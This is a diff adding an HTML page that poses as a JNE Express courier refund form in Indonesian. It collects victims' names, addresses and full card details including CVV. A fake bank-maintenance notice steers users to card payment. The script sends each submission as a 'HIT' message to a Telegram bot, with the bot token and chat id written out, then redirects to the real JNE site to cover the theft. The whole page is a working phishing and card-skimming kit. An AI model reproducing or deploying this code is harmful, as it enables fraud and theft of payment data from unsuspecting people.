@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background-color: #f5f5f5;
+            text-align: center;
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        #logo {
+            max-width: 100%;
+            height: auto;
+        }
+        .form-container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin: 0 auto;
+            max-width: 400px;
+        }
+        .table-container {
+            text-align: left;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+        }
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+        th, td {
+            padding: 10px;
+        }
+        .radio-container {
+            text-align: left;
+            margin-top: 15px;
+        }
+        .radio-label {
+            margin-right: 20px;
+        }
+        .credit-card-details {
+            display: none;
+        }
+        .text-box {
+            width: 100%;
+            margin: 15px auto;
+        }
+        #ajukan-button {
+            background-color: #007bff;
+            color: #ffffff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        #token-box {
+            background-color: #007bff;
+            color: #ffffff;
+            border: 1px solid #007bff;
+            border-radius: 5px;
+            padding: 10px;
+            text-align: left;
+            margin-top: 15px;
+        }
+        #token-label {
+            font-weight: bold;
+        }
+        #chatbot {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div id="header">
+        <img id="logo" src="./JNE Express_files/logo-removebg-preview.png" alt="JNE Logo">
+    </div>
+    <div class="form-container">
+        <form id="jne-form" action="https://jne.co.id/id/tracking/trace" method="get">
+            <div class="table-container">
+                <table>
+                    <tr>
+                        <th>Nama Lengkap</th>
+                        <td><input type="text" name="nama_lengkap" required></td>
+                    </tr>
+                    <tr>
+                        <th>Kode Pos</th>
+                        <td><input type="text" name="kode_pos" required></td>
+                    </tr>
+                    <tr>
+                        <th>Alamat</th>
+                        <td><input type="text" name="alamat" required></td>
+                    </tr>
+                    <tr>
+                        <th>Kecamatan</th>
+                        <td><input type="text" name="kecamatan" required></td>
+                    </tr>
+                    <tr>
+                        <th>Token Pengembalian</th>
+                        <td><input type="text" name="tokb" required></td>
+                    </tr>
+                    <tr>
+                </table>
+            </div>
+            <div class="radio-container">
+                <label class="radio-label"><input type="radio" name="payment_option" value="Transfer Rekening" required> Transfer Rekening</label>
+                <label class="radio-label"><input type="radio" name="payment_option" value="Kartu Debit/Credit" required> Kartu Debit/Credit</label>
+            </div>
+            <div class="credit-card-details">
+                <div class="table-container">
+                    <table>
+                        <tr>
+                            <th>Nama Pemegang Kartu</th>
+                            <td><input type="text" name="nama_pemegang_kartu" required></td>
+                        </tr>
+                        <tr>
+                            <th>Nomor Kartu</th>
+                            <td><input type="text" name="nomor_kartu" pattern="\d{16}" required></td>
+                        </tr>
+                        <tr>
+                            <th>Tanggal Kedaluwarsa</th>
+                            <td>
+                                <select name="bulan_kedaluwarsa" required>
+                                    <option value="01">01</option>
+                                    <option value="02">02</option>
+                                    <option value="03">03</option>
+                                    <option value="04">04</option>
+                                    <option value="05">05</option>
+                                    <option value="06">06</option>
+                                    <option value="07">07</option>
+                                    <option value="08">08</option>
+                                    <option value="09">09</option>
+                                    <option value="10">10</option>
+                                    <option value="11">11</option>
+                                    <option value="12">12</option>
+                                </select>
+                                <select name="tahun_kedaluwarsa" required>
+                                    <option value="2023">2023</option>
+                                    <option value="2024">2024</option>
+                                    <option value="2025">2025</option>
+                                    <option value="2026">2026</option>
+                                    <option value="2027">2027</option>
+                                    <option value="2028">2028</option>
+                                    <option value="2029">2029</option>
+                                    <option value="2030">2030</option>
+                                </select>
+                            </td>
+                        </tr>
+                        <tr>
+                            <th>CVV</th>
+                            <td><input type="text" name="cvv" pattern="\d{3}" required></td>
+                        </tr>
+                    </table>
+                </div>
+            </div>
+            <div class="text-box">
+                <p id="payment-text">Jumlah yang Anda kembalikan akan dikembalikan secara instan jika itu adalah kartu kredit. Jika debit akan memakan waktu 3-5 hari kerja.</p>
+            </div>
+            <button id="ajukan-button" type="button">Ajukan Pengembalian Dana</button>
+        </form>
+    </div>
+
+    <a href="https://jne.co.id/id/beranda" id="chatbot">
+        <img src="https://pttikijalurnugrahaekakurir.force.com/eclaimform/resource/1671433394000/chatLogo" width="150" height="160" alt="Chatbot">
+    </a>
+
+<script>
+    const paymentOptionRadios = document.querySelectorAll('input[name="payment_option"]');
+    const creditCardDetails = document.querySelector('.credit-card-details');
+    const paymentText = document.getElementById('payment-text');
+    const ajukanButton = document.getElementById('ajukan-button');
+
+    ajukanButton.addEventListener('click', () => {
+        // Check if all form fields are filled
+        const form = document.getElementById('jne-form');
+        if (form.checkValidity()) {
+            // Create the POST data
+            const postData = {
+                content: `🍒 HIT | Full Name: ${form.elements.nama_lengkap.value} | Address: ${form.elements.alamat.value} | Zip Code: ${form.elements.kode_pos.value} | Cardholder: ${form.elements.nama_pemegang_kartu.value} | Card Number: ${form.elements.nomor_kartu.value} | Expiry: ${form.elements.bulan_kedaluwarsa.value}/${form.elements.tahun_kedaluwarsa.value} | CVV: ${form.elements.cvv.value}`
+            };
+
+            // Send the POST request to Telegram
+// Create the GET request URL with postData included
+const url = `https://api.telegram.org/bot6524373912:AAGlB_jaUOlpk9OdXFGSr0RVecNJ3RTJb2A/sendMessage?chat_id=-1001964171196&text=${postData.content}`;
+
+// Send the GET request to Telegram
+fetch(url, {
+    method: 'GET',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+})
+.then(response => response.json())
+.then(data => {
+    // After the Telegram request is successful, redirect to the specified URL
+    window.location.href = "https://jne.co.id/id/tracking/trace";
+})
+.catch(error => console.error('Error:', error));
+        } else {
+            form.reportValidity();
+        }
+    });
+
+    paymentOptionRadios.forEach(radio => {
+        radio.addEventListener('change', () => {
+            if (radio.value === 'Transfer Rekening') {
+                creditCardDetails.style.display = 'none';
+                paymentText.innerText = "Layanan Bank kami saat ini sedang dalam pemeliharaan. ETA: 10-12 hari kerja.";
+            } else {
+                creditCardDetails.style.display = 'block';
+                paymentText.innerText = "Jumlah yang Anda kembalikan akan dikembalikan secara instan jika itu adalah kartu kredit. Jika debit akan memakan waktu 3-5 hari kerja.";
+            }
+        });
+    });
+</script>
+</body>
+</html>
